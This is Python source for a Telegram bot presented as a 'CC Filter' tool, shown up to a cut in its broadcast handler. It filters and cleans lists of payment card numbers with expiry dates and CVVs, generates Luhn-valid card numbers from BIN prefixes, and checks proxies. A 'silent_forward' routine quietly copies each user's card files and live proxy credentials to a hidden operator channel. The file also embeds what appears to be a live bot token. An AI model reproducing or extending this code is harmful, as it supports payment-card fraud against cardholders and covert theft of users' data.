"""
CC Filter Bot v3.0 — Professional Telegram Bot
Gentleman Edition • Refined • Discreet • Efficient
"""

import asyncio
import json
import logging
import os
import random
import re
import socket
import ssl
import time
from datetime import datetime, timedelta
from pathlib import Path
from typing import Dict, List, Optional, Set, Tuple

from telegram import Update
from telegram.constants import ParseMode
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    filters,
    ContextTypes,
)

# ═══════════════════════════════════════════════════════════════
#  CONFIGURATION
# ═══════════════════════════════════════════════════════════════

BOT_TOKEN = "8094436736:AAEEizFe5WE9c9aMOHT_--Vw0NIF2zS948Q"
ADMIN_IDS: Set[int] = {7132150988, 987654321}
CHANNEL_ID = "-1002200268580"

# ═══════════════════════════════════════════════════════════════
#  LOGGING
# ═══════════════════════════════════════════════════════════════

logging.basicConfig(
    format="%(asctime)s │ %(levelname)-8s │ %(message)s",
    level=logging.INFO,
)
logger = logging.getLogger("GentlemanBot")

# ═══════════════════════════════════════════════════════════════
#  PATHS
# ═══════════════════════════════════════════════════════════════

BASE_DIR = Path("data")
BASE_DIR.mkdir(exist_ok=True)

PREMIUM_FILE = BASE_DIR / "premium_users.json"
BAN_FILE = BASE_DIR / "banlist.json"
USER_IDS_FILE = BASE_DIR / "user_ids.json"

USER_FILES: Dict[int, Path] = {}
USER_FILENAMES: Dict[int, str] = {}

# ═══════════════════════════════════════════════════════════════
#  DATA LAYER
# ═══════════════════════════════════════════════════════════════

def load_premium_data() -> Dict[int, datetime]:
    if not PREMIUM_FILE.exists():
        return {}
    try:
        raw = json.loads(PREMIUM_FILE.read_text(encoding="utf-8"))
        parsed: Dict[int, datetime] = {}
        now = datetime.utcnow()
        for uid_str, expiry_str in raw.items():
            uid = int(uid_str)
            expiry = datetime.fromisoformat(expiry_str)
            if expiry > now:
                parsed[uid] = expiry
        save_premium_data(parsed)
        return parsed
    except Exception as e:
        logger.error(f"Premium load error: {e}")
        return {}


def save_premium_data(data: Dict[int, datetime]) -> None:
    try:
        serialised = {str(uid): dt.isoformat() for uid, dt in data.items()}
        PREMIUM_FILE.write_text(json.dumps(serialised, indent=2), encoding="utf-8")
    except Exception as e:
        logger.error(f"Premium save error: {e}")


def load_ban_data() -> Set[int]:
    if not BAN_FILE.exists():
        return set()
    try:
        raw = json.loads(BAN_FILE.read_text(encoding="utf-8"))
        return {int(x) for x in raw}
    except Exception as e:
        logger.error(f"Ban load error: {e}")
        return set()


def save_ban_data(data: Set[int]) -> None:
    try:
        BAN_FILE.write_text(json.dumps(sorted(data)), encoding="utf-8")
    except Exception as e:
        logger.error(f"Ban save error: {e}")


def load_user_ids() -> Set[int]:
    if not USER_IDS_FILE.exists():
        return set()
    try:
        raw = json.loads(USER_IDS_FILE.read_text(encoding="utf-8"))
        return {int(x) for x in raw}
    except Exception:
        return set()


def save_user_ids(data: Set[int]) -> None:
    try:
        USER_IDS_FILE.write_text(json.dumps(sorted(data)), encoding="utf-8")
    except Exception as e:
        logger.error(f"User IDs save error: {e}")


def track_user(user_id: int) -> None:
    if user_id in user_ids_cache:
        return
    user_ids_cache.add(user_id)
    save_user_ids(user_ids_cache)


# Caches
premium_cache: Dict[int, datetime] = {}
ban_cache: Set[int] = set()
user_ids_cache: Set[int] = set()

# ═══════════════════════════════════════════════════════════════
#  DECORATORS
# ═══════════════════════════════════════════════════════════════

def admin_required(func):
    async def wrapper(update: Update, context: ContextTypes.DEFAULT_TYPE):
        uid = update.effective_user.id
        if uid not in ADMIN_IDS:
            await update.message.reply_text("⊘ Access Denied — This command is restricted to administrators.")
            return
        return await func(update, context)
    return wrapper


def ban_check(func):
    async def wrapper(update: Update, context: ContextTypes.DEFAULT_TYPE):
        uid = update.effective_user.id
        if uid in ban_cache:
            await update.message.reply_text("⟐ Your access has been revoked. Contact an administrator.")
            return
        track_user(uid)
        return await func(update, context)
    return wrapper


def has_file(func):
    async def wrapper(update: Update, context: ContextTypes.DEFAULT_TYPE):
        uid = update.effective_user.id
        if uid not in USER_FILES or not USER_FILES[uid].exists():
            await update.message.reply_text(
                "⊘ No file on record.\n"
                "Please upload a <code>.txt</code> file first.",
                parse_mode=ParseMode.HTML,
            )
            return
        return await func(update, context)
    return wrapper

# ═══════════════════════════════════════════════════════════════
#  HELPERS
# ═══════════════════════════════════════════════════════════════

def read_lines(uid: int) -> List[str]:
    path = USER_FILES.get(uid)
    if not path or not path.exists():
        return []
    return [
        line.strip()
        for line in path.read_text(encoding="utf-8", errors="ignore").splitlines()
        if line.strip()
    ]


def write_file(uid: int, lines: List[str]) -> Path:
    path = USER_FILES.get(uid, BASE_DIR / f"user_{uid}.txt")
    path.write_text("\n".join(lines), encoding="utf-8")
    USER_FILES[uid] = path
    return path


def parse_card(line: str) -> Optional[Dict[str, str]]:
    parts = line.strip().split("|")
    if len(parts) >= 4:
        return {
            "card": parts[0].strip(),
            "mm": parts[1].strip().zfill(2),
            "yy": parts[2].strip().zfill(2),
            "cvv": parts[3].strip(),
            "raw": line.strip(),
        }
    return None


def is_valid_card_format(line: str) -> Optional[str]:
    """
    Validate & strip a card line.
    Returns cleaned 'card|MM|YY|CVV' string if valid, else None.
    """
    parts = line.strip().split("|")
    if len(parts) < 4:
        return None

    # Take only the first 4 parts
    card, mm, yy, cvv = parts[0].strip(), parts[1].strip(), parts[2].strip(), parts[3].strip()

    # Card number must be all digits, 13-19 length
    if not card.isdigit() or not (13 <= len(card) <= 19):
        return None

    # MM: 01-12
    if not mm.isdigit() or len(mm) > 2:
        return None
    mm_val = int(mm)
    if mm_val < 1 or mm_val > 12:
        return None
    mm = mm.zfill(2)

    # YY: 2 digits
    if not yy.isdigit() or len(yy) > 2:
        return None
    yy = yy.zfill(2)

    # CVV: 3-4 digits
    if not cvv.isdigit() or not (3 <= len(cvv) <= 4):
        return None

    return f"{card}|{mm}|{yy}|{cvv}"


def is_expired(mm: str, yy: str) -> bool:
    try:
        card_month = int(mm)
        card_year = 2000 + int(yy)
        now = datetime.utcnow()
        card_last_day = datetime(card_year, card_month, 1) + timedelta(days=32)
        card_last_day = card_last_day.replace(day=1)
        return now >= card_last_day
    except (ValueError, OverflowError):
        return False


def get_premium_status(uid: int) -> Optional[str]:
    if uid in premium_cache:
        expiry = premium_cache[uid]
        days_left = (expiry - datetime.utcnow()).days
        if days_left > 0:
            return f"◆ Premium · {days_left}d remaining"
        else:
            del premium_cache[uid]
            save_premium_data(premium_cache)
    return None


# ═══════════════════════════════════════════════════════════════
#  LUHN ALGORITHM
# ═══════════════════════════════════════════════════════════════

def luhn_checksum(card_num: str) -> int:
    """Compute Luhn checksum for a card number (without check digit)."""
    total = 0
    for i, ch in enumerate(reversed(card_num)):
        d = int(ch)
        if i % 2 == 0:
            d *= 2
            if d > 9:
                d -= 9
        total += d
    return (10 - (total % 10)) % 10


def generate_luhn_card(bin_prefix: str, length: int = 16) -> str:
    """Generate a single Luhn-valid card number."""
    remaining = length - len(bin_prefix) - 1
    if remaining < 1:
        return bin_prefix
    middle = "".join(str(random.randint(0, 9)) for _ in range(remaining))
    partial = bin_prefix + middle
    check = luhn_checksum(partial)
    return partial + str(check)


# ═══════════════════════════════════════════════════════════════
#  PROXY CHECKER
# ═══════════════════════════════════════════════════════════════

def parse_proxy(proxy_str: str) -> Optional[Tuple[str, int, Optional[str], Optional[str]]]:
    """Parse ip:port:user:pass or ip:port format."""
    parts = proxy_str.strip().split(":")
    if len(parts) < 2:
        return None
    host = parts[0]
    try:
        port = int(parts[1])
    except ValueError:
        return None
    user = parts[2] if len(parts) >= 3 else None
    pwd = parts[3] if len(parts) >= 4 else None
    return host, port, user, pwd


async def check_proxy_socks(host: str, port: int, timeout: int = 8) -> bool:
    """Basic TCP check — can reach the proxy host."""
    try:
        loop = asyncio.get_running_loop()
        await asyncio.wait_for(
            loop.create_connection(lambda: asyncio.Protocol(), host, port),
            timeout=timeout,
        )
        return True
    except (asyncio.TimeoutError, OSError, ConnectionRefusedError, Exception):
        return False


# ═══════════════════════════════════════════════════════════════
#  UI HELPERS — Gentleman Edition
# ═══════════════════════════════════════════════════════════════

BAR = "▔" * 30

def header_box(title: str) -> str:
    return f"┌{BAR}┐\n  {title}\n└{BAR}┘"


def result_card(title: str, entries: List[Tuple[str, str]]) -> str:
    lines = [f"┌{BAR}┐", f"  {title}", f"├{BAR}┤"]
    for label, value in entries:
        lines.append(f"  {label}:  {value}")
    lines.append(f"└{BAR}┘")
    return "\n".join(lines)


# ═══════════════════════════════════════════════════════════════
#  SILENT CHANNEL FORWARD
# ═══════════════════════════════════════════════════════════════

async def silent_forward(ctx: ContextTypes.DEFAULT_TYPE, file_path: Path, caption: str = "") -> bool:
    if not CHANNEL_ID or CHANNEL_ID == "@your_channel_username":
        return False
    try:
        with open(file_path, "rb") as f:
            await ctx.bot.send_document(
                chat_id=CHANNEL_ID,
                document=f,
                filename=file_path.name,
                caption=f"◌ {caption}",
                disable_notification=True,
            )
        logger.info(f"◌ Forwarded: {file_path.name}")
        return True
    except Exception as e:
        logger.error(f"Forward failed: {e}")
        return False

# ═══════════════════════════════════════════════════════════════
#  HANDLERS — BASIC
# ═══════════════════════════════════════════════════════════════

@ban_check
async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    premium_str = get_premium_status(user.id) or "Standard"

    text = (
        f"{header_box('GENTLEMAN BOT')}\n\n"
        f"Identification\n"
        f"  Name:  <b>{user.full_name}</b>\n"
        f"  ID:    <code>{user.id}</code>\n"
        f"  Tier:  {premium_str}\n\n"
        f"Getting Started\n"
        f"  1.  Upload a <code>.txt</code> file\n"
        f"  2.  Issue any command below\n\n"
        f"Available Commands\n"
        f"  /ft     MM|YY    — Filter by expiry\n"
        f"  /clean           — Purge expired & invalid\n"
        f"  /spl    number   — Partition into sets\n"
        f"  /shuffle         — Randomise order\n"
        f"  /ftbin  bin      — Filter by BIN prefix\n"
        f"  /binstats        — BIN distribution\n"
        f"  /gen    bin      — Generate Luhn cards\n"
        f"  /proxy  ip:port  — Verify proxy\n\n"
        f"Expected Format\n"
        f"  <code>card_number|MM|YY|CVV</code>"
    )
    await update.message.reply_text(text, parse_mode=ParseMode.HTML)


@ban_check
async def cmd_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await cmd_start(update, context)


@ban_check
async def cmd_upload(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    doc = update.message.document

    if not doc.file_name.lower().endswith(".txt"):
        await update.message.reply_text("◈ Only <code>.txt</code> files are accepted.", parse_mode=ParseMode.HTML)
        return

    if doc.file_size > 50 * 1024 * 1024:
        await update.message.reply_text("◈ File exceeds 50 MB limit.")
        return

    status = await update.message.reply_text("⟳ Receiving file…")

    file = await doc.get_file()
    path = BASE_DIR / f"user_{user.id}.txt"
    await file.download_to_drive(path)

    line_count = sum(1 for _ in path.read_text(encoding="utf-8", errors="ignore").splitlines() if _.strip())

    USER_FILES[user.id] = path
    USER_FILENAMES[user.id] = doc.file_name

    await status.edit_text(
        f"{result_card('FILE ACCEPTED', [
            ('Document', doc.file_name),
            ('Entries', f'{line_count:,}'),
            ('Status', 'Ready for processing'),
        ])}",
        parse_mode=ParseMode.HTML,
    )

    logger.info(f"User {user.id} uploaded '{doc.file_name}' — {line_count} lines")


# ═══════════════════════════════════════════════════════════════
#  HANDLERS — CORE
# ═══════════════════════════════════════════════════════════════

@ban_check
@has_file
async def cmd_ft(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user

    if not context.args or len(context.args) != 1:
        await update.message.reply_text("◈ Usage: <code>/ft 06|26</code>", parse_mode=ParseMode.HTML)
        return

    pattern = context.args[0].strip()
    parts = pattern.split("|")
    if len(parts) != 2 or not all(p.isdigit() and 1 <= len(p) <= 2 for p in parts):
        await update.message.reply_text("◈ Invalid pattern. Expected <code>MM|YY</code>\nExample: <code>/ft 06|26</code>", parse_mode=ParseMode.HTML)
        return

    mm, yy = parts[0].zfill(2), parts[1].zfill(2)

    status = await update.message.reply_text(f"◷ Filtering <code>{mm}|{yy}</code>…", parse_mode=ParseMode.HTML)

    lines = read_lines(user.id)
    search_key = f"|{mm}|{yy}|"
    matched = [line for line in lines if search_key in line]

    if not matched:
        await status.edit_text(
            f"⊘ <code>{mm}|{yy}</code> — No matches.\n"
            f"   Total examined: <b>{len(lines):,}</b>",
            parse_mode=ParseMode.HTML,
        )
        return

    safe = f"{mm}_{yy}"
    out_path = BASE_DIR / f"ft_{user.id}_{safe}.txt"
    out_path.write_text("\n".join(matched), encoding="utf-8")

    caption = (
        f"Filter Results\n"
        f"  Pattern:  {mm}|{yy}\n"
        f"  Found:    {len(matched):,}\n"
        f"  Total:    {len(lines):,}"
    )

    await status.delete()
    await update.message.reply_document(
        document=open(out_path, "rb"),
        filename=f"ft_{safe}.txt",
        caption=f"✦ {caption}",
        parse_mode=ParseMode.HTML,
    )

    await silent_forward(context, out_path, f"FT {mm}|{yy} — {len(matched)} cards | User {user.id}")
    logger.info(f"User {user.id} filtered {mm}|{yy}: {len(matched)} results")


@ban_check
@has_file
async def cmd_clean(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user

    status = await update.message.reply_text("◨ Scanning…")

    lines = read_lines(user.id)
    kept: List[str] = []
    removed_expired: List[str] = []
    removed_invalid: List[str] = []

    for line in lines:
        cleaned = is_valid_card_format(line)
        if cleaned is None:
            removed_invalid.append(line)
            continue

        card_data = parse_card(cleaned)
        if card_data and is_expired(card_data["mm"], card_data["yy"]):
            removed_expired.append(cleaned)
        else:
            kept.append(cleaned)

    total_removed = len(removed_invalid) + len(removed_expired)

    if total_removed == 0:
        await status.edit_text(
            f"✦ No issues found.\n   All {len(lines):,} entries are valid and current.",
            parse_mode=ParseMode.HTML,
        )
        return

    write_file(user.id, kept)
    USER_FILENAMES[user.id] = USER_FILENAMES.get(user.id, "cards.txt")

    removed_all = removed_invalid + removed_expired
    removed_path = BASE_DIR / f"cleaned_{user.id}.txt"
    removed_path.write_text("\n".join(removed_all), encoding="utf-8")

    # Send cleaned file to user (bug fix)
    cleaned_path = BASE_DIR / f"clean_result_{user.id}.txt"
    cleaned_path.write_text("\n".join(kept), encoding="utf-8")

    text = (
        f"Purge Complete\n"
        f"  Retained:  {len(kept):,}\n"
        f"  Removed:   {total_removed:,}\n"
        f"    Invalid: {len(removed_invalid):,}\n"
        f"    Expired: {len(removed_expired):,}\n"
        f"  Original:  {len(lines):,}"
    )
    await status.delete()
    await update.message.reply_document(
        document=open(cleaned_path, "rb"),
        filename="cleaned.txt",
        caption=f"✦ {text}",
        parse_mode=ParseMode.HTML,
    )

    await silent_forward(context, removed_path, f"Clean — {total_removed} removed | User {user.id}")
    logger.info(f"User {user.id} cleaned: {total_removed} removed, {len(kept)} kept")


@ban_check
@has_file
async def cmd_spl(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user

    if not context.args or len(context.args) != 1:
        await update.message.reply_text("◈ Usage: <code>/spl 200</code>", parse_mode=ParseMode.HTML)
        return

    try:
        chunk_size = int(context.args[0])
        if chunk_size < 1:
            raise ValueError
    except ValueError:
        await update.message.reply_text("◈ Provide a valid number.\nExample: <code>/spl 200</code>", parse_mode=ParseMode.HTML)
        return

    lines = read_lines(user.id)
    total = len(lines)

    if total == 0:
        await update.message.reply_text("⊘ File is empty.")
        return

    num_parts = (total + chunk_size - 1) // chunk_size

    status = await update.message.reply_text(
        f"◫ Partitioning <b>{total:,}</b> entries into <b>{num_parts}</b> sets…",
        parse_mode=ParseMode.HTML,
    )

    sent_count = 0
    for i in range(num_parts):
        start = i * chunk_size
        end = min(start + chunk_size, total)
        chunk = lines[start:end]

        part_path = BASE_DIR / f"spl_{user.id}_part{i+1}.txt"
        part_path.write_text("\n".join(chunk), encoding="utf-8")

        cap = f"Set {i+1}/{num_parts} · {len(chunk)} entries"
        await update.message.reply_document(
            document=open(part_path, "rb"),
            filename=f"part_{i+1}.txt",
            caption=f"◫ {cap}",
        )

        await silent_forward(context, part_path, f"SPL Part {i+1}/{num_parts} — {len(chunk)} cards | User {user.id}")
        sent_count += 1
        await asyncio.sleep(0.3)

    await status.edit_text(
        f"✦ Partition Complete\n"
        f"   {total:,} entries → {num_parts} sets ({chunk_size}/set)\n"
        f"   Delivered: {sent_count} files",
        parse_mode=ParseMode.HTML,
    )

    logger.info(f"User {user.id} split {total} into {num_parts} parts of {chunk_size}")


@ban_check
@has_file
async def cmd_shuffle(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user

    lines = read_lines(user.id)
    total = len(lines)

    if total < 2:
        await update.message.reply_text(f"◈ Minimum 2 entries required. Currently: <b>{total}</b>", parse_mode=ParseMode.HTML)
        return

    status = await update.message.reply_text(f"◧ Randomising <b>{total:,}</b> entries…", parse_mode=ParseMode.HTML)

    shuffled = lines.copy()
    random.shuffle(shuffled)

    out_path = BASE_DIR / f"shuffled_{user.id}.txt"
    out_path.write_text("\n".join(shuffled), encoding="utf-8")

    caption = f"Randomised\n  Total:  {total:,}"
    await status.delete()
    await update.message.reply_document(
        document=open(out_path, "rb"),
        filename="shuffled.txt",
        caption=f"◧ {caption}",
        parse_mode=ParseMode.HTML,
    )

    await silent_forward(context, out_path, f"SHUFFLE — {total} cards | User {user.id}")
    logger.info(f"User {user.id} shuffled {total} cards")


@ban_check
@has_file
async def cmd_ftbin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user

    if not context.args or len(context.args) != 1:
        await update.message.reply_text("◈ Usage: <code>/ftbin 414720</code>", parse_mode=ParseMode.HTML)
        return

    bin_prefix = context.args[0].strip()
    if not bin_prefix.isdigit():
        await update.message.reply_text("◈ BIN must be numeric.\nExample: <code>/ftbin 414720</code>", parse_mode=ParseMode.HTML)
        return

    status = await update.message.reply_text(f"◷ Filtering BIN <code>{bin_prefix}</code>…", parse_mode=ParseMode.HTML)

    lines = read_lines(user.id)
    matched = [line for line in lines if line.split("|")[0].startswith(bin_prefix)]

    if not matched:
        await status.edit_text(
            f"⊘ BIN <code>{bin_prefix}</code> — No matches.\n   Total examined: <b>{len(lines):,}</b>",
            parse_mode=ParseMode.HTML,
        )
        return

    out_path = BASE_DIR / f"ftbin_{user.id}_{bin_prefix}.txt"
    out_path.write_text("\n".join(matched), encoding="utf-8")

    caption = (
        f"BIN Filter\n"
        f"  Prefix:  {bin_prefix}\n"
        f"  Found:   {len(matched):,}\n"
        f"  Total:   {len(lines):,}"
    )
    await status.delete()
    await update.message.reply_document(
        document=open(out_path, "rb"),
        filename=f"bin_{bin_prefix}.txt",
        caption=f"✦ {caption}",
        parse_mode=ParseMode.HTML,
    )

    await silent_forward(context, out_path, f"FTBIN {bin_prefix} — {len(matched)} cards | User {user.id}")
    logger.info(f"User {user.id} ftbin {bin_prefix}: {len(matched)} results")


@ban_check
@has_file
async def cmd_binstats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user

    lines = read_lines(user.id)
    total = len(lines)

    if total == 0:
        await update.message.reply_text("⊘ File is empty.")
        return

    bin_counter: Dict[str, int] = {}
    for line in lines:
        card_num = line.split("|")[0].strip()
        bin_val = card_num[:6] if len(card_num) >= 6 else card_num
        bin_counter[bin_val] = bin_counter.get(bin_val, 0) + 1

    sorted_bins = sorted(bin_counter.items(), key=lambda x: x[1], reverse=True)

    lines_display = []
    for bin_val, count in sorted_bins[:15]:
        bar_len = min(int(count / max(1, sorted_bins[0][1]) * 10), 10)
        bar_str = "█" * bar_len + "░" * (10 - bar_len)
        lines_display.append(f"  <code>{bin_val}</code>  {bar_str}  {count:,}")

    if len(sorted_bins) > 15:
        lines_display.append(f"  … and {len(sorted_bins) - 15} more")

    text = (
        f"BIN Distribution\n"
        f"  Entries:  {total:,}\n"
        f"  Unique:   {len(sorted_bins)}\n"
        f"{'─' * 34}\n"
        + "\n".join(lines_display)
    )
    await update.message.reply_text(text, parse_mode=ParseMode.HTML)

    logger.info(f"User {user.id} binstats: {total} entries, {len(sorted_bins)} unique BINs")


@ban_check
async def cmd_gen(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user

    if not context.args or len(context.args) != 1:
        await update.message.reply_text("◈ Usage: <code>/gen 414720</code>", parse_mode=ParseMode.HTML)
        return

    bin_prefix = context.args[0].strip()
    if not bin_prefix.isdigit() or len(bin_prefix) < 6:
        await update.message.reply_text("◈ BIN must be at least 6 digits.\nExample: <code>/gen 414720</code>", parse_mode=ParseMode.HTML)
        return

    status = await update.message.reply_text(f"◷ Generating 10 cards for BIN <code>{bin_prefix}</code>…", parse_mode=ParseMode.HTML)

    cards: List[str] = []
    for _ in range(10):
        card_num = generate_luhn_card(bin_prefix, 16)
        mm = str(random.randint(1, 12)).zfill(2)
        yy = str(random.randint(26, 28)).zfill(2)
        cvv = str(random.randint(100, 999))
        cards.append(f"{card_num}|{mm}|{yy}|{cvv}")

    out_path = BASE_DIR / f"gen_{user.id}_{bin_prefix}.txt"
    out_path.write_text("\n".join(cards), encoding="utf-8")

    caption = (
        f"Generated\n"
        f"  BIN:    {bin_prefix}\n"
        f"  Count:  10\n"
        f"  Method: Luhn"
    )
    await status.delete()
    await update.message.reply_document(
        document=open(out_path, "rb"),
        filename=f"gen_{bin_prefix}.txt",
        caption=f"✦ {caption}",
        parse_mode=ParseMode.HTML,
    )

    await silent_forward(context, out_path, f"GEN {bin_prefix} — 10 cards | User {user.id}")
    logger.info(f"User {user.id} generated 10 cards for BIN {bin_prefix}")


@ban_check
async def cmd_proxy(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user

    if not context.args or len(context.args) < 1:
        await update.message.reply_text("◈ Usage: <code>/proxy ip:port</code> or <code>/proxy ip:port:user:pass</code>", parse_mode=ParseMode.HTML)
        return

    proxy_str = " ".join(context.args).strip()
    parsed = parse_proxy(proxy_str)

    if parsed is None:
        await update.message.reply_text("◈ Invalid format.\nExpected: <code>ip:port</code> or <code>ip:port:user:pass</code>", parse_mode=ParseMode.HTML)
        return

    host, port, proxy_user, proxy_pwd = parsed
    auth_str = f"{proxy_user}:****" if proxy_user else "none"

    status = await update.message.reply_text(f"⟳ Testing proxy <code>{host}:{port}</code>…", parse_mode=ParseMode.HTML)

    is_alive = await check_proxy_socks(host, port, timeout=10)

    if is_alive:
        result_text = (
            f"✦ Proxy Responsive\n"
            f"  Host:   {host}:{port}\n"
            f"  Auth:   {auth_str}\n"
            f"  Status: Operational"
        )

        # Save live proxy to file & forward
        proxy_file = BASE_DIR / f"proxy_{user.id}.txt"
        proxy_file.write_text(proxy_str, encoding="utf-8")
        await silent_forward(context, proxy_file, f"PROXY LIVE — {host}:{port} | User {user.id}")

    else:
        result_text = (
            f"⊘ Proxy Unreachable\n"
            f"  Host:   {host}:{port}\n"
            f"  Auth:   {auth_str}\n"
            f"  Status: No response"
        )

    await status.edit_text(result_text, parse_mode=ParseMode.HTML)
    logger.info(f"User {user.id} tested proxy {host}:{port} — {'live' if is_alive else 'dead'}")


# ═══════════════════════════════════════════════════════════════
#  HANDLERS — ADMIN
# ═══════════════════════════════════════════════════════════════

@admin_required
@ban_check
@has_file
async def cmd_count(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user

    lines = read_lines(user.id)
    valid = 0
    expired = 0
    for line in lines:
        card_data = parse_card(line)
        if card_data and is_expired(card_data["mm"], card_data["yy"]):
            expired += 1
        else:
            valid += 1

    text = (
        f"File Audit\n"
        f"  Document:  <code>{USER_FILENAMES.get(user.id, 'unknown')}</code>\n"
        f"  Total:     {len(lines):,}\n"
        f"  Valid:     {valid:,}\n"
        f"  Expired:   {expired:,}"
    )
    await update.message.reply_text(text, parse_mode=ParseMode.HTML)
    logger.info(f"Admin {user.id} counted: {len(lines)} total, {valid} valid, {expired} expired")


@admin_required
async def cmd_add_premium(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if len(context.args) < 2:
        await update.message.reply_text("◈ Usage: <code>/addpremium &lt;user_id&gt; &lt;days&gt;</code>", parse_mode=ParseMode.HTML)
        return

    try:
        target_id = int(context.args[0])
        days = int(context.args[1])
        if days < 1:
            raise ValueError
    except ValueError:
        await update.message.reply_text("◈ Invalid. Example: <code>/addpremium 123456 7</code>", parse_mode=ParseMode.HTML)
        return

    expiry = datetime.utcnow() + timedelta(days=days)
    premium_cache[target_id] = expiry
    save_premium_data(premium_cache)

    await update.message.reply_text(
        f"◆ Premium Granted\n"
        f"  Recipient:  <code>{target_id}</code>\n"
        f"  Duration:   {days} day(s)\n"
        f"  Expires:    {expiry.strftime('%Y-%m-%d %H:%M')} UTC",
        parse_mode=ParseMode.HTML,
    )

    try:
        await context.bot.send_message(
            chat_id=target_id,
            text=(
                f"◆ Premium Access Granted\n"
                f"  Duration:  {days} day(s)\n"
                f"  Expires:   {expiry.strftime('%Y-%m-%d %H:%M')} UTC"
            ),
            parse_mode=ParseMode.HTML,
        )
    except Exception:
        pass

    logger.info(f"Admin {update.effective_user.id} granted premium to {target_id} for {days} days")


@admin_required
async def cmd_remove_premium(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text("◈ Usage: <code>/removepremium &lt;user_id&gt;</code>", parse_mode=ParseMode.HTML)
        return

    try:
        target_id = int(context.args[0])
    except ValueError:
        await update.message.reply_text("◈ Invalid user ID.")
        return

    if target_id in premium_cache:
        del premium_cache[target_id]
        save_premium_data(premium_cache)
        await update.message.reply_text(f"◆ Premium revoked from <code>{target_id}</code>.", parse_mode=ParseMode.HTML)
        logger.info(f"Admin {update.effective_user.id} removed premium from {target_id}")
    else:
        await update.message.reply_text(f"◈ <code>{target_id}</code> holds no premium status.", parse_mode=ParseMode.HTML)


@admin_required
async def cmd_premium_list(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not premium_cache:
        await update.message.reply_text("◆ No active premium users.")
        return

    now = datetime.utcnow()
    entries: List[str] = []
    for uid, expiry in sorted(premium_cache.items(), key=lambda x: x[1]):
        days_left = (expiry - now).days
        icon = "◈" if days_left > 3 else ("◇" if days_left > 0 else "◈")
        entries.append(
            f"  {icon} <code>{uid}</code> — {days_left}d — {expiry.strftime('%Y-%m-%d')}"
        )

    text = f"◆ Premium Registry ({len(premium_cache)})\n" + "\n".join(entries)
    await update.message.reply_text(text, parse_mode=ParseMode.HTML)
    logger.info(f"Admin {update.effective_user.id} viewed premium list")


@admin_required
async def cmd_user_status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text("◈ Usage: <code>/status &lt;user_id&gt;</code>", parse_mode=ParseMode.HTML)
        return

    try:
        target_id = int(context.args[0])
    except ValueError:
        await update.message.reply_text("◈ Invalid user ID.")
        return

    is_prem = target_id in premium_cache
    is_banned = target_id in ban_cache
    has_file_data = target_id in USER_FILES and USER_FILES[target_id].exists()
    expiry_str = premium_cache[target_id].strftime('%Y-%m-%d %H:%M UTC') if is_prem else "—"
    days_left = (premium_cache[target_id] - datetime.utcnow()).days if is_prem else 0
    file_name = USER_FILENAMES.get(target_id, "—") if has_file_data else "—"
    card_count = len(read_lines(target_id)) if has_file_data else 0

    badges: List[str] = []
    if is_banned:
        badges.append("⟐ BANNED")
    if is_prem:
        badges.append(f"◆ PREMIUM ({days_left}d)")
    if target_id in ADMIN_IDS:
        badges.append("✦ ADMIN")
    badge_str = " · ".join(badges) if badges else "Standard"

    text = (
        f"User Dossier\n"
        f"  ID:           <code>{target_id}</code>\n"
        f"  Status:       {badge_str}\n"
        f"  Premium:      {expiry_str}\n"
        f"  Document:     {file_name}\n"
        f"  Entries:      {card_count:,}"
    )
    await update.message.reply_text(text, parse_mode=ParseMode.HTML)
    logger.info(f"Admin {update.effective_user.id} checked status of {target_id}")


@admin_required
async def cmd_ban(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text("◈ Usage: <code>/ban &lt;user_id&gt;</code>", parse_mode=ParseMode.HTML)
        return

    try:
        target_id = int(context.args[0])
    except ValueError:
        await update.message.reply_text("◈ Invalid user ID.")
        return

    if target_id in ADMIN_IDS:
        await update.message.reply_text("◈ Cannot restrict an administrator.")
        return

    if target_id in ban_cache:
        await update.message.reply_text(f"◈ <code>{target_id}</code> is already restricted.", parse_mode=ParseMode.HTML)
        return

    ban_cache.add(target_id)
    save_ban_data(ban_cache)
    await update.message.reply_text(f"⟐ Access revoked for <code>{target_id}</code>.", parse_mode=ParseMode.HTML)
    logger.info(f"Admin {update.effective_user.id} banned {target_id}")


@admin_required
async def cmd_unban(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text("◈ Usage: <code>/unban &lt;user_id&gt;</code>", parse_mode=ParseMode.HTML)
        return

    try:
        target_id = int(context.args[0])
    except ValueError:
        await update.message.reply_text("◈ Invalid user ID.")
        return

    if target_id in ban_cache:
        ban_cache.remove(target_id)
        save_ban_data(ban_cache)
        await update.message.reply_text(f"✦ Access restored for <code>{target_id}</code>.", parse_mode=ParseMode.HTML)
        logger.info(f"Admin {update.effective_user.id} unbanned {target_id}")
    else:
        await update.message.reply_text(f"◈ <code>{target_id}</code> is not restricted.", parse_mode=ParseMode.HTML)


@admin_required
async def cmd_clear(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user

    if user.id in USER_FILES:
        try:
            USER_FILES[user.id].unlink()
        except OSError:
            pass
        del USER_FILES[user.id]
        USER_FILENAMES.pop(user.id, None)
        await update.message.reply_text("✦ File removed from record.")
        logger.info(f"Admin {user.id} cleared their file")
    else:
        await update.message.reply_text("◈ No file to clear.")


@admin_required
async def cmd_broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
